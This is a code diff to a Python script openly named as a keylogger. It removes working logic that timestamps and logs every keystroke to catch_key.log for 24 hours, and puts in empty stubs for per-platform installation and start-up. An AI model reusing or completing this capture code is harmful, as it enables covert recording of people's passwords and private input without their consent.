@@ -2,9 +2,8 @@
 
 import logging
 import os
+import sys
 import time
-
-import keylogger
 
 curr_path = os.path.dirname(os.path.abspath(__file__))
 file_name = 'catch_key.log'
@@ -30,19 +29,23 @@ def get_logger():
 logger = get_logger()
 
 
-def recoding_keys(t, modifiers, keys):
-    if keys:
-        date = "{}  {}".format(t, keys)
-        logger.info(date)
+def define_system():
+    system = sys.platform
+    return system
+
+
+def install_keylogger(system):
+    if system == 'linux':
+        pass
+    elif system == 'darwin':
+        pass
     else:
-        for key, value in modifiers.items():
-            if value:
-                date = "{}  {}".format(t, key)
-                logger.info(date)
-                break
+        pass
+
+
+def start_keylogger(t, modifiers, keys):
+    pass
 
 
 if __name__ == "__main__":
-    now = time.time()
-    when_stop = lambda: time.time() > now + 60 * 60 * 24
-    keylogger.log(when_stop, recoding_keys)
+    pass
